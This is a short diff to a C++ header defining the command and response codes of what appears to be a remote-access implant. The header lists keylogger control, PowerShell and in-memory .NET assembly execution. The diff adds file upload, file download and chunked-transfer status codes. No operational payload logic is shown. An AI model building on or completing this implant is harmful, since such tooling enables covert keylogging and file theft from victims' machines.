@@ -18,6 +18,7 @@
 #define DOWNLOAD_CHUNK 8
 #define START_KEYLOGGER 9
 #define STOP_KEYLOGGER 10
+#define DOWNLOAD_FINAL 11
 
 // Task Types
 #define NOP 0
@@ -46,6 +47,7 @@
 #define MORE_TO_FOLLOW 6
 #define NO_MORE_TO_FOLLOW 7
 #define COMPLETED 8
+#define DOWNLOAD_CHUNK_STATUS 9
 
 template <typename T>
 struct TaskResponse
@@ -173,7 +175,14 @@ struct TaskError
 	}
 };
 
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<CommandNetAsm>, TaskRequest<CommandKeylogger>, TaskRequest<bool>>;
+using Request = std::variant<
+	TaskRequest<CommandPowershell>,
+	TaskRequest<CommandWinTask>,
+	TaskRequest<CommandNetAsm>,
+	TaskRequest<CommandKeylogger>,
+	TaskRequest<CommandUploadFile>,
+	TaskRequest<CommandDownloadFile>,
+	TaskRequest<bool>>;
 using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response> &tasks)
